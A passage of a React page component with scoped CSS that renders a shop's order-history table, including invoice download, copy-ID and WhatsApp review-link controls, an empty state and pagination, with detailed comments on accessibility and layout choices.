                      const label = STATUS_LABEL[ order.status ] || 'Status unavailable';
                      // ONE local, read in two places - the row tag and the panel rung - so the
                      // two cannot disagree. Anything that is not exactly 'whatsapp' is the
                      // website, which matches the server's own coercion and makes a row that
                      // predates the field (or arrives from the serving index's older
                      // projection) read as 'Website' rather than as blank.
                      const sourceLabel = order.channel === 'whatsapp' ? 'WhatsApp' : 'Website';
                      const note = order.status
                        ? ( STATUS_NOTE[ order.status ] || '' )
                        : 'Contact us and we will check.';

                      // FIRST MATCH WINS, and the gate plus the three structural refusals are
                      // all evaluated BEFORE any state is consulted. Computed as a word so the
                      // ladder stays readable and the JSX stays one short chain over one value.
                      const invoiceCell:
                        'absent' | 'ineligible' | InvoiceState =
                          !featureFlags.invoiceDownload ? 'absent'
                            : !INVOICE_ELIGIBLE.has( order.status ) ? 'ineligible'
                              : !invoiceKey ? 'ineligible'
                                : !Number.isInteger( order.createdAt )
                                  || ( order.createdAt as number ) <= 0 ? 'ineligible'
                                  : state;

                      // The panel's Invoice rung, same first-match-wins shape, and row 1 carries
                      // THE SAME FLAG TERM as the cell's first row so the two cannot drift. The
                      // third arm omits the rung entirely rather than echoing the transient
                      // state: the column carries that, and the panel must not grow a second
                      // place where it can disagree with the column.
                      const panelInvoice =
                        ( !featureFlags.invoiceDownload || state === 'none' )
                          ? 'No invoice for this order. Some paid orders never get one — '
                            + 'contact us and we will check.'
                          : !INVOICE_ELIGIBLE.has( order.status )
                            ? 'An invoice is created once the payment is settled.'
                            : '';

                      // THE ATTRIBUTED REVIEW DOOR. `wa.me/<WABA1>?text=review <REF>`, so the
                      // CUSTOMER messages us and their own message opens the 24-hour window the
                      // review Flow needs. This page sends nothing.
                      //
                      // Deliberately reusing `copyValue`'s ladder, not `displayId`'s: the two
                      // real identifiers and never the date, for the same reason — a date is not
                      // something staff can resolve to an order.
                      //
                      // '' omits the row entirely rather than rendering an unattributed button.
                      // A review door in a per-order panel that carries no order would attribute
                      // nothing while looking like it does, and the direct Leave Review menu action is the
                      // unattributed door for anyone who wants one. `isCarriableReference` is the
                      // same bound the Lambda enforces on arrival, so the legacy spaced order
                      // number ('WD-ORD - A1B2C3D4 - …') drops out here instead of travelling as
                      // a mangled reference that matches no order.
                      const reviewHref =
                        featureFlags.reviewCta && isCarriableReference( copyValue )
                          ? reviewWaLink( copyValue )
                          : '';

                      return (
                        <React.Fragment key={ rowId }>
                          <tr className={ isOpen ? 'ord-tr ord-tr-open' : 'ord-tr' }>
                            { /* aria-label is the IDENTIFIER ONLY. A <th scope="row"> is
                                 re-announced before each data cell in a screen reader's table
                                 mode, and its default name is its text content - which here is
                                 the trigger, the copy button, the hint, the Ref line and the
                                 folded date, announced five times per row. The label RENAMES the
                                 cell; it does not hide what is in it, so everything inside stays
                                 in the DOM, focusable and separately named. */ }
                            <th scope="row" className="ord-td" aria-label={ displayId }>
                              <button
                                type="button"
                                className="ord-ordbtn"
                                aria-expanded={ isOpen }
                                aria-controls={ detailId }
                                onClick={ () => toggleRow( rowId ) }
                              >
                                <span
                                  className="ord-ordno"
                                  id={ `ord-id-${ index }` }
                                  data-wc-no-translate
                                >
                                  { displayId }
                                </span>
                                <span className="ord-caret" aria-hidden="true">
                                  { isOpen ? '\u25be' : '\u25b8' }
                                </span>
                              </button>
                              { /* Copy is available only when Clipboard API and a stable
                                   identifier exist. Feedback stays in the shared top-right toast. */ }
                              { canCopy && copyValue && (
                                <button
                                  type="button"
                                  className="ord-copy"
                                  aria-label={ `Copy order ID ${ copyValue }` }
                                  title="Copy order ID"
                                  onClick={ () => copyId( copyValue, index ) }
                                >
                                  <OrderActionIcon name="copy_all" />
                                </button>
                              ) }
                              <span className="ord-subdate">{ date }</span>
                            </th>
                            { /* Deliberately TRANSLATABLE: a localised month name is an
                                 improvement and no decision depends on its spelling. Empty on an
                                 unreadable createdAt, never "Invalid Date". */ }
                            <td className="ord-td ord-col-date">{ date }</td>
                            <td className="ord-td ord-td-num">
                              { amount
                                // Flagged because SupportWidget rewrites text-node values, and a
                                // regrouped or renumbered amount would make this page lie about
                                // money. "Amount unavailable" stays unflagged prose, so it
                                // translates.
                                ? <span className="ord-amount" data-wc-no-translate>{ amount }</span>
                                : 'Amount unavailable' }
                            </td>
                            <td className="ord-td">
                              <span
                                className={ STATUS_FIRM.has( order.status )
                                  ? 'ord-status ord-status-firm'
                                  : 'ord-status' }
                                title={ note || undefined }
                                aria-label={ note ? `${ label }. ${ note }` : label }
                              >
                                <span className="ord-status-label">{ label }</span>
                              </span>
                            </td>
                            <td className="ord-td ord-invoice-cell">
                              <span className="ord-invoice-actions">
                              { invoiceCell === 'absent' || invoiceCell === 'none'
                                || invoiceCell === 'ineligible'
                                ? (
                                  <span className="ord-unavailable"
                                    title="Invoice not available yet"
                                    aria-label="Invoice not available yet">—</span>
                                )
                                : (
                                  <>
                                    <button
                                      type="button"
                                      className="ord-inv"
                                      disabled={ invoiceCell === 'busy' }
                                      aria-busy={ invoiceCell === 'busy' ? true : undefined }
                                      aria-label={ invoiceCell === 'busy'
                                        ? 'Preparing invoice'
                                        : invoiceCell === 'failed'
                                          ? 'Try invoice download again'
                                          : 'Download invoice' }
                                      title={ invoiceCell === 'failed' ? 'Try again' : 'Download invoice' }
                                      onClick={ () => downloadInvoice( order ) }
                                    >
                                      <OrderActionIcon name="download" />
                                    </button>
                                  </>
                                ) }
                              <OrderActionsMenu orderNumber={ order.orderNumber } />
                              </span>
                            </td>
                          </tr>
                          { isOpen && (
                            // A <td>, never a <th>, so the five-column header equality is
                            // unaffected. colSpan={5} because a detail spanning fewer would
                            // misalign the hairlines.
                            <tr className="ord-detailrow ord-tr-open">
                              <td className="ord-detailcell" colSpan={ 5 }>
                                <div id={ detailId }>
                                  <div className="ord-detail-inline">
                                    <dl className="ord-compact-facts">
                                      <div>
                                        <dt>Ref</dt>
                                        <dd data-wc-no-translate>{ order.referenceId || '—' }</dd>
                                      </div>
                                      <div>
                                        <dt>Placed</dt>
                                        <dd>{ dateTimeLabel( order.createdAt ) || '—' }</dd>
                                      </div>
                                      <div>
                                        <dt>Via</dt>
                                        <dd>{ sourceLabel }</dd>
                                      </div>
                                    </dl>
                                    <div className="ord-detail-actions">
                                      { !!reviewHref && (
                                        <PillButton as="a" href={ reviewHref } action="Review" />
                                      ) }
                                    </div>
                                    { !!panelInvoice && <p className="ord-invnote">{ panelInvoice }</p> }
                                  </div>
                                  { isPublicOrderNumber( order.orderNumber ) && token && (
                                    <div className="ord-detail-full">
                                      <OrderDetail accessToken={ token }
                                        orderNumber={ order.orderNumber }
                                        onExpired={ expire } onNotice={ detailNotice } />
                                    </div>
                                  ) }
                                </div>
                              </td>
                            </tr>
                          ) }
                        </React.Fragment>
                      );
                    } ) }
                  </tbody>
                </table>
              </div>

              { !!cursor && (
                <div className="ord-pager">
                  <button type="button" className="ord-quiet"
                    onClick={ loadMore } disabled={ loadingMore }>
                    { loadingMore ? 'Loading…' : 'Older orders' }
                  </button>
                </div>
              ) }
            </section>
          ) }

          { view === 'empty' && (
            <section className="ord-empty" aria-labelledby="ord-empty-title">
              <div className="ord-empty-head">
                <h2 className="ord-h2" id="ord-empty-title">No orders yet</h2>
                <button type="button" className="ord-account-action ord-signout"
                  aria-label="Sign out" title="Sign out" onClick={ signOut }>
                  <OrderActionIcon name="logout" />
                </button>
              </div>
              { checking
                ? (
                  // A SUB-STATE, not a sixth state: only the body is replaced, and it resolves
                  // on its own. The line is neutral because this endpoint cannot know whether a
                  // payment exists - it only knows the first page was empty, and the common
                  // visitor on that branch has never bought anything. "Your order is being
                  // confirmed" would be a confident wrong statement to most of them.
                  <p className="ord-p" role="status">Checking for recent orders…</p>
                )
                : (
                  <>
                    <p className="ord-p">
                      Anything you buy from us will show up here with its payment status.
                    </p>
                    <PillButton as="a" href="/shop/" action="Shop" />
                    { /* WIDENED on purpose, and the second clause is the load-bearing half:
                         finalization can stage PURCHASED_SNAPSHOT_MISSING and return BEFORE the
                         order write, so a captured payment can leave no order row at all,
                         permanently, with no later writer able to create one. This page must
                         therefore not assert that nothing was bought. */ }
                    <p className="ord-aside">
                      Ordered over WhatsApp, or paid in the last few minutes and don&apos;t see
                      it here? Contact us and we will check.
                    </p>
                  </>
                ) }
            </section>
          ) }
              </div>
            </div>
          ) }

          {/* The global Contribute + Subscribe + Share dock is mounted once by _app after policy. */}
        </div>

        <style jsx>{`
          /* ord- prefixed throughout: the globally imported src/styles/*.css declares unscoped
             rules for generic names and styled-jsx does not shield a page from them. Every rule
             lives in THIS return tree - no row helper and no hoisted <style jsx> variable,
             because styled-jsx stamps its scoping class only onto JSX it compiles alongside, and
             the run-together "Sign inSend code" the owner reported was that exact bug.

             No top padding, no measure, no gutters, no font-family on a container and no
             viewport height at all: PageTopBand owns every one of those, and a second copy is a
             second thing to get wrong at one of the two header heights. */

          /* Declared rather than inferred. prefers-color-scheme appears zero times under src/,
             so the site is light-only; stating it stops a browser inferring a scheme and
             recolouring form controls against a hardcoded light palette. */
          /* 1100px, not the 700px a single column of prose wanted: a five-column table inside
             700px is a permanent horizontal scroll. 1100 sits INSIDE PageTopBand's 1300px
             measure, so the band's gutters still apply and nothing re-declares them. */
          .ord-page{color-scheme:light;display:flex;flex-direction:column;gap:var(--public-section-gap);max-width:1100px}

          /* Mobile-first: one column, panel above orders, which is both the DOM order and the
             layout this page already had. The 1024px override lives with every other media
             query at the foot of this stylesheet, after the defaults it overrides. */
          .ord-shell{display:grid;grid-template-columns:minmax(0,1fr);gap:40px}
          /* min-inline-size:0 for the same reason as minmax(0,...): a flex/grid item defaults to
             min-content and refuses to shrink. No position:sticky - the panel is short, and
             sticky interacts badly with overflow ancestors. */
          .ord-panel,.ord-main{display:flex;flex-direction:column;gap:24px;min-inline-size:0}
          /* Customer/account context is a single contained surface, matching the cart review
             card rather than floating controls beside the history table. */
          .ord-panel{align-self:stretch;padding:0;border:0;background:transparent}
          .ord-summary{max-width:960px}
          .ord-summary-head{display:flex;align-items:flex-end;gap:20px;margin-bottom:18px}
          .ord-eyebrow{margin:0 0 8px;font-size:14px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--public-brand-green)}
          .ord-summary-rows{margin:0;border-top:1px solid var(--public-hairline)}
          .ord-summary-rows>div{display:grid;grid-template-columns:120px minmax(0,1fr);gap:18px;padding:16px 0;border-bottom:1px solid var(--public-hairline)}
          .ord-summary-rows dt{font-size:13px;font-weight:700;color:var(--public-brand-green)}
          .ord-summary-rows dd{margin:0;font-size:17px;line-height:1.45;color:#1a1a1a}
          .ord-verified{display:inline-flex;margin-inline-start:8px;padding:3px 8px;border-radius:999px;background:var(--public-lime-tint);color:var(--public-brand-green);font-size:12px;font-weight:700}
          .ord-support{margin-top:12px}
          .ord-support summary{display:inline-flex;align-items:center;min-height:44px;padding:0;color:var(--public-brand-green);font-size:16px;font-weight:700;text-decoration:underline;text-underline-offset:3px;cursor:pointer}
          .ord-support p{margin:4px 0 0;padding:10px 0 10px 12px;border-inline-start:3px solid var(--public-brand-lime);font-size:15px;color:var(--public-muted)}
          .ord-pager{width:100%;margin-top:4px}
          .ord-pager-copy{display:flex;justify-content:space-between;gap:16px;margin-bottom:8px;font-size:14px;color:var(--public-muted)}
          .ord-pager-copy strong{color:var(--public-brand-green)}
          .ord-pager-rail{height:3px;background:#edf0e8;border-radius:999px;overflow:hidden}
          .ord-pager-rail span{display:block;width:38%;height:100%;background:var(--public-brand-lime)}
          .ord-pager .ord-quiet{margin-top:12px}

          /* The section rung: 700 against the band's 600 h1. That inversion is the site's and is
             deliberate - PageTopBand says not to "correct" it. Font stack DECLARED, not
             inherited: with the global body rule absent an inheriting lockup falls to a serif
             while a declaring headline stays on Inter. */
          .ord-h2{
            font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
            font-size:var(--public-section-size);font-weight:var(--public-section-weight);line-height:var(--public-section-leading);
            letter-spacing:var(--public-section-tracking);color:var(--public-heading);margin:0 0 14px;
          }
          /* The one body rung: 20px/400/1.4/-.125px at rgba(0,0,0,.898), 18px under 767px. */
          .ord-p,.ord-aside{
            font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
            font-size:var(--public-body-size);font-weight:var(--public-body-weight);line-height:var(--public-body-leading);letter-spacing:var(--public-body-tracking);
            color:var(--public-body);margin:0;
          }
          .ord-gate{display:flex;flex-direction:column;align-items:flex-start;gap:20px}
          .ord-nodetails{padding:18px;border:1px solid var(--public-hairline);border-radius:14px;background:#fff}
          .ord-link{color:var(--public-brand-green);font-weight:600;text-decoration:underline;text-decoration-thickness:1px;text-underline-offset:2px}

          /* The state treatment, lifted from .cart-status: a lime tint behind a solid lime
             inline-start edge with #1a3a2a type. A luminance and weight step rather than a hue,
             which is what survives forced-colors and reduced colour discrimination - and colour
             is never the only cue, because every one of these states is also stated in words. */
          /* Match the /auth sign-in error treatment pixel for pixel, but right-align
             the notice above Orders. No fixed overlay, timer, or duplicate row alert. */
          .ord-toast-rail{display:flex;flex-direction:column;align-items:flex-end;gap:8px;inline-size:100%;min-inline-size:0}
          .ord-backend-toast{
            box-sizing:border-box;inline-size:min(100%,560px);
            margin:14px 0 0;padding:11px 13px;
            border-inline-start:4px solid var(--public-brand-lime);border-radius:10px;
            background:var(--public-lime-tint);color:var(--public-text);
            font-family:var(--font-sans);
            font-size:var(--public-supporting-size);font-weight:600;line-height:1.4;
            overflow-wrap:anywhere;
          }
          /* Clipboard success is a short, content-width toast. Backend failures keep
             their larger readable banner; lengthy clipboard fallback text wraps. */
          .ord-backend-toast.ord-copy-toast{
            inline-size:fit-content;max-inline-size:min(100%,320px);
            margin:0;padding:8px 12px;
          }

          /* A TABLE IS CORRECT HERE, and the 280px objection the previous comment raised is
             answered by the container rather than by avoiding a table: .ord-tablewrap's
             overflow-x:auto plus the shell's minmax(0,1fr) keep
             document.documentElement.scrollWidth - vw at 0, which is what
             tools/browser/devicecheck.js measures. The definition list, which does still
             collapse to one column for free, is now the DETAIL PANEL's layout - which is why
             these three rules survive the card markup being deleted. */
          .ord-table{
            width:100%;border-collapse:collapse;
            font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
          }
          /* max-inline-size:100% IS WHAT MAKES THE SCROLL CONTAINER SCROLL. .ord-list lays its
             children out with align-items:flex-start, so without a cap this wrapper is
             fit-content wide, which for a five-column table is its min-content (about 670px), and
             the overflow lands on the DOCUMENT instead of in here. Measured signed in at 375px:
             188px of sideways page scroll with every panel closed, 309px with one open. Capped,
             the wrapper is never wider than its column, and at desktop widths, where the table
             fits, nothing changes. */
          .ord-tablewrap{overflow-x:auto;max-inline-size:100%;border:0;border-block-start:1px solid var(--public-hairline);border-radius:0;background:transparent}
          .ord-tablewrap:focus-visible{outline:3px solid #1a3a2a;outline-offset:3px}

          /* 1px and static: these borders never change. The row's hover is a background tint
             only, and the 2px weight stays reserved for hoverable controls. */
          .ord-th{
            text-align:start;padding:14px 16px;border-block-end:1px solid var(--public-hairline);
            font-size:12px;font-weight:700;letter-spacing:0;color:var(--public-brand-green);white-space:nowrap;
            background:transparent;
          }
          .ord-th-num{text-align:end}
          .ord-tr{border-block-start:1px solid var(--public-hairline)}
          /* A reading aid, not an affordance: the <tr> has no onClick, no role, no tabindex and
             no cursor:pointer, so there is nothing to discover and fail to activate. Row
             tracking across five columns is what the tint is for. No :active equivalent - a tap
             on a row must do nothing and look like it did nothing. */
          .ord-tr:hover{background:var(--public-lime-tint)}

          /* text-align:start and font-weight:400 are RESETS, and required rather than tidy:
             .ord-td is also carried by the <th scope="row"> in column 1, where the UA stylesheet
             gives font-weight:bold;text-align:center. .ord-th's start alignment does not reach
             it (that class is on the column headers only), so without these two the widest cell
             on the page renders CENTRED against four start/end-aligned columns with its loose
             text in bold. "start", never "left" - the source gate forbids physical directions
             and text-align:left matches it. */
          .ord-td{
            padding:16px;font-size:16px;line-height:1.5;color:#1a1a1a;vertical-align:top;
            text-align:start;font-weight:400;
          }
          .ord-td-num{text-align:end;font-variant-numeric:tabular-nums}
          .ord-ordno{font-size:16px;font-weight:700;letter-spacing:-.25px;color:#1a1a1a;overflow-wrap:anywhere}

          /* The 14px/400/rgba(0,0,0,.54) sub-line rung, shared by all three sub-lines below the
             identifier. Not 13px: a one-pixel "table cells are tighter" exception is not a
             reason to leave the ladder. */
          .ord-ref{display:block;font-size:14px;font-weight:400;color:var(--public-muted)}
          /* The order-source tag. The SAME sub-line rung as .ord-ref, deliberately: the tag is
             metadata about the row and promoting it with a pill, a background or a brand colour
             would make a label compete with the order number for attention. 700 rather than 400
             is the only departure, so it reads as a label and not as a second reference line -
             and because the weight is doing that work, the tag is never distinguished by colour
             alone, which is what keeps it legible to a reader who cannot tell these two greys
             apart. Page-local on purpose: the shared control CSS under src/styles/ belongs to
             another worktree and this rule has one consumer. */
          .ord-src{display:block;font-size:14px;font-weight:700;color:var(--public-muted)}
          /* Same rung, but it is the Date column's understudy: hidden while that column is
             visible, so the date renders EXACTLY ONCE at every width. Declared display:none
             here, ahead of every media query, and flipped in the SAME query that hides the
             column it replaces - separating the two is what once rendered the date twice above
             767px, and a test that checked only the column would have passed on it. */
          .ord-subdate{display:none;font-size:14px;font-weight:400;color:var(--public-muted)}
          .ord-invnote{display:block;font-size:14px;font-weight:400;color:var(--public-muted)}

          .ord-ordbtn{
            display:inline-flex;align-items:center;gap:8px;min-height:44px;
            margin:0;padding:0;border:0;background:none;cursor:pointer;
            font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
            text-align:start;color:#1a1a1a;
            text-decoration:underline;text-decoration-thickness:1px;text-underline-offset:2px;
          }
          /* 1px at rest, 2px on hover and focus - the hairline split applied to a TEXT
             affordance rather than to a border, so the "2px means hoverable" signal still holds
             without inventing a boxed control inside a table cell. The vocabulary is
             .ord-link's, reused rather than coined. */
          .ord-ordbtn:hover,.ord-ordbtn:focus-visible{text-decoration-thickness:2px}
          .ord-ordbtn:focus-visible{outline:3px solid #1a3a2a;outline-offset:3px}
          .ord-caret{font-size:12px;color:var(--public-brand-green)}

          .ord-tr-open{background:var(--public-lime-tint)}
          .ord-detailcell{
            padding:4px 16px 20px;border-block-end:1px solid var(--public-hairline);
            background:var(--public-lime-tint);
          }

          .ord-facts{margin:0;display:grid;grid-template-columns:96px 1fr;gap:8px 12px;align-items:baseline}
          .ord-facts dt{font-size:12px;font-weight:700;color:var(--public-brand-green)}
          .ord-facts dd{margin:0;font-size:16px;line-height:1.5;color:#1a1a1a}
          .ord-amount{font-weight:700}
          .ord-status{
            display:inline-flex;flex-direction:column;gap:2px;
            padding:14px 16px;border-inline-start:3px solid var(--public-brand-lime);border-radius:10px;
            background:var(--public-lime-tint);color:var(--public-brand-green);line-height:1.5;
          }
          .ord-status-firm{border-inline-start-width:4px}
          .ord-status-label{font-size:16px;font-weight:600}
          .ord-status-firm .ord-status-label{font-weight:700}
          .ord-status-note{font-size:14px;font-weight:400}

          /* The quiet secondary, reused from /checkout/status/'s co-btn-quiet so the page keeps
             exactly one lime SURFACE (the pill) and this one carries a lime EDGE instead. The
             control is identified by its <button> semantics and its #1a3a2a-on-white label, not
             by the edge - #d1f470 on white is 1.24:1 and does not clear 1.4.11 on its own - and
             the focus indicator is the dark outline. */
          /* THE INVOICE AND COPY CONTROLS ARE NEW SIZES OF THIS, NOT NEW BUTTONS, and
             "inherits" is not a CSS mechanism - so the mechanism is to EXTEND this selector
             list. Nothing in the body changes. A duplicated block was rejected by name: two
             copies of border:2px solid #d1f470 and min-height:44px drift independently, and
             the tap-target gate would then pass on whichever copy still said 44px. Two of these
             classes on one element was rejected too - the override would depend on source order
             between two classes of equal specificity, which is the fragility that gets "fixed"
             with !important.

             The first :disabled selector is kept on purpose: dropping it would stop dimming
             "Show more orders" at rest. align-self:flex-start comes along from this body and is
             inert inside a <td>, which is not a flex container - noted so it is not read as a
             mistake. */
          .ord-quiet,.ord-inv,.ord-copy,.ord-view{
            align-self:flex-start;display:inline-flex;align-items:center;justify-content:center;
            min-height:44px;padding:0 24px;border:2px solid #d1f470;border-radius:50px;
            background:#fff;color:var(--public-brand-green);font:inherit;font-size:17px;font-weight:600;cursor:pointer;
          }
          .ord-quiet:hover:not(:disabled),.ord-inv:hover:not(:disabled),.ord-copy:hover:not(:disabled),.ord-view:hover{background:var(--public-lime-tint)}
          .ord-quiet:focus-visible,.ord-inv:focus-visible,.ord-copy:focus-visible,.ord-view:focus-visible{outline:3px solid #1a3a2a;outline-offset:3px}
          .ord-quiet:disabled,.ord-inv:disabled,.ord-copy:disabled{opacity:.55;cursor:default}

          /* The only differences, as overrides AFTER the shared body. font-size has to be
             re-stated because that body sets font:inherit, a shorthand that resets it. */
          .ord-inv{font-size:15px;padding:0 16px}
          .ord-copy{font-size:14px;padding:0 12px;margin-inline-start:12px}
          /* An anchor in the button's clothes: no underline, and it may wrap at 200% text size. */
          .ord-view{font-size:15px;padding:0 16px;text-decoration:none;text-align:center}

          .ord-list{
            width:100%;box-sizing:border-box;display:flex;flex-direction:column;align-items:stretch;gap:18px;
            padding:clamp(24px,3.2vw,32px);border:1px solid var(--public-hairline);
            border-top:4px solid var(--public-brand-lime);border-radius:24px;background:var(--public-bg);
            box-shadow:0 14px 38px rgba(26,58,42,.08);
          }
          .ord-list-head,.ord-empty-head{display:flex;align-items:center;justify-content:space-between;gap:12px}
          .ord-account-action{
            display:inline-flex;align-items:center;justify-content:center;min-height:44px;
            padding:8px 16px;border:2px solid var(--public-brand-green);border-radius:11px;
            color:var(--public-brand-green);font:inherit;font-size:16px;font-weight:700;line-height:1.35;
            cursor:pointer;transition:background-color .18s,transform .18s,box-shadow .18s;
          }
          .ord-account-action:hover:not(:disabled){background:#fff;transform:translateY(-1px);box-shadow:var(--public-lift-shadow)}
          .ord-account-action:focus-visible{outline:3px solid var(--public-brand-green);outline-offset:3px}
          .ord-account-action:disabled{opacity:.55;cursor:default}
          .ord-account-action[aria-busy='true']{cursor:progress}
          .ord-empty{display:flex;flex-direction:column;align-items:flex-start;gap:18px}
          .ord-empty-head{inline-size:100%}
          .ord-list .ord-h2,.ord-empty .ord-h2{margin:0}


          /* The homepage is the source of truth: Inter, white, forest green and lime.
             This is a data-dense view, so use its supporting/data/meta type tokens rather
             than creating a second, hard-coded typography scale. */
          .ord-page{
            gap:18px;background:var(--public-bg);color:var(--public-body);
            font-family:var(--font-sans);
          }
          .ord-shell,.ord-main{gap:12px}

          /* Match HeaderCart's lime + forest-green pairing, but show the lime surface
             at rest on Orders as requested. Keep 44px targets and a 10px radius,
             with no grey fills or icon badges. */
          .ord-account-action,.ord-copy,.ord-inv{
            box-sizing:border-box;inline-size:44px;min-inline-size:44px;block-size:44px;
            min-height:44px;display:inline-flex;align-items:center;justify-content:center;
            padding:0;margin:0;border:0;border-radius:10px;
            background:var(--public-brand-lime);color:var(--public-brand-green);
            font:inherit;cursor:pointer;
            transition:background-color .18s ease,box-shadow .18s ease;
          }
          .ord-copy{margin-inline-start:8px}
          .ord-account-action:hover:not(:disabled),
          .ord-copy:hover:not(:disabled),.ord-inv:hover:not(:disabled){
            background:var(--lime-hover);color:var(--public-brand-green);
            border:0;box-shadow:none;
            transform:none;opacity:1;
          }
          .ord-account-action:focus-visible,
          .ord-copy:focus-visible,.ord-inv:focus-visible{
            background:var(--public-brand-lime);outline:2px solid var(--public-brand-green);
            outline-offset:2px;
          }
          .ord-account-action:disabled,.ord-copy:disabled,.ord-inv:disabled{
            opacity:.55;cursor:default;
          }

          /* Pure white surfaces; no grey table-header background or tinted row fill.
             A slim lime rule carries the same brand accent as Home. */
          .ord-list{
            padding:0;gap:0;border:1px solid var(--public-brand-lime);
            border-block-start:2px solid var(--public-brand-lime);
            border-radius:16px;background:var(--public-bg);box-shadow:none;
          }
          .ord-list-head{padding:10px 14px}
          .ord-list .ord-h2{
            font-family:var(--font-sans);font-size:var(--public-card-size);
            font-weight:var(--public-card-weight);line-height:var(--public-card-leading);
            letter-spacing:var(--public-card-tracking);color:var(--public-heading);
          }
          .ord-table{
            min-inline-size:600px;background:transparent;
            font-family:var(--font-sans);color:var(--public-body);
          }
          .ord-tablewrap{
            border-block-start:0;overflow-x:auto;background:transparent;
          }
          .ord-th{
            padding:10px 12px;background:var(--public-brand-lime);
            border-block-end:2px solid var(--public-brand-green);
            color:var(--public-brand-green);
            font-family:var(--font-sans);font-size:var(--public-meta-size);
            font-weight:700;
          }
          .ord-td{
            padding:4px 12px;vertical-align:middle;
            font-family:var(--font-sans);font-size:var(--public-supporting-size);
            line-height:1.4;color:var(--public-body);
          }
          .ord-ordbtn{
            min-height:44px;border:0;background:transparent;text-decoration:none;
            font-family:var(--font-sans);color:var(--public-heading);
          }
          .ord-ordno{
            font-size:var(--public-supporting-size);font-weight:700;
            color:var(--public-heading);
          }
          .ord-amount{
            font-size:var(--public-data-size);font-weight:700;
            color:var(--public-heading);
          }
          .ord-tr,.ord-tr-open{background:transparent}
          .ord-tr:hover,.ord-tr-open:hover{
            background:transparent;box-shadow:none;
          }
          .ord-detailcell{
            padding:12px 16px;background:transparent;
          }

          /* Payment state stays readable as text, with one lime marker instead of
             tinted/grey pills. The firm state remains a weight step. */
          .ord-status,.ord-status-firm{
            display:inline-flex;flex-direction:row;align-items:center;gap:8px;
            padding:0;border:0;background:transparent;
            color:var(--public-brand-green);line-height:1.35;
          }
          .ord-status::before{
            content:'';display:inline-block;flex:none;inline-size:8px;block-size:8px;
            border-radius:50%;background:var(--public-brand-lime);
            box-shadow:0 0 0 1px var(--public-brand-green);
          }
          .ord-status-label,.ord-status-firm .ord-status-label{
            font-family:var(--font-sans);font-size:var(--public-meta-size);
            font-weight:600;white-space:nowrap;
          }
          .ord-status-firm .ord-status-label{font-weight:700}
          /* Intrinsic-width invoice column keeps the action buttons close to the right edge. */
          .ord-th:last-child,.ord-invoice-cell{inline-size:1%;white-space:nowrap}
          .ord-invoice-actions{display:inline-flex;align-items:center;gap:16px}
          .ord-unavailable{
            font-size:var(--public-card-size);color:var(--public-brand-green);
          }
          .ord-invnote{
            font-family:var(--font-sans);font-size:var(--public-meta-size);
            color:var(--public-brand-green);
          }
          .ord-detail-inline{
            display:flex;flex-wrap:wrap;align-items:center;gap:12px 22px;
          }
          .ord-compact-facts{
            display:flex;flex-wrap:wrap;gap:8px 20px;margin:0;
          }
          .ord-compact-facts>div{display:flex;align-items:baseline;gap:6px}
          .ord-compact-facts dt{
            font-family:var(--font-sans);font-size:var(--public-meta-size);
            font-weight:700;color:var(--public-brand-green);
          }
          .ord-compact-facts dd{
            margin:0;font-family:var(--font-sans);font-size:var(--public-meta-size);
            color:var(--public-body);overflow-wrap:anywhere;
          }
          .ord-detail-actions{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
          .ord-view{
            min-height:44px;padding:0 12px;border:0;background:transparent;
            font-family:var(--font-sans);font-size:var(--public-meta-size);
            color:var(--public-brand-green);
            text-decoration:underline;text-decoration-color:var(--public-brand-lime);
            text-underline-offset:4px;
          }
          .ord-view:hover{background:transparent;text-decoration-thickness:2px}
          .ord-pager{margin:0;padding:10px 18px}

          /* EVERY MEDIA QUERY LIVES BELOW HERE, after the defaults it overrides. */
          @media(min-width:1024px){
            .ord-shell{grid-template-columns:minmax(0,1fr);gap:12px}
          }

          @media(max-width:767px){
            .ord-page{gap:16px}
            .ord-shell{gap:12px}
            .ord-p,.ord-aside{font-size:18px}
            .ord-list{padding:0;border-radius:14px}
            .ord-summary-head{align-items:flex-start;flex-direction:column;gap:6px}
            .ord-summary-rows>div{grid-template-columns:1fr;gap:4px;padding:14px 0}
            .ord-verified{margin-inline-start:6px}
            .ord-facts{grid-template-columns:1fr;gap:4px}
            .ord-col-date{display:none}
            .ord-subdate{display:block}
            .ord-table{min-inline-size:480px}
            .ord-th{padding:10px 8px}
            .ord-td{padding:5px 8px}
            .ord-th:first-child,.ord-td:first-child{padding-inline-start:10px}
            .ord-tablewrap{overflow-x:auto;border-inline:0;border-radius:0}
            .ord-pager-copy{font-size:13px}
          }

          /* NO ENTRANCE ANIMATION OF ITS OWN, and the absence is the point: opacity:0 does not
             remove an element from the tab order, and this page's children contain buttons, a
             link and a form. PageTopBand arms only its heading and sub-line, never children. */
        `}</style>
      </RotatingHero>
    </>
  );
}
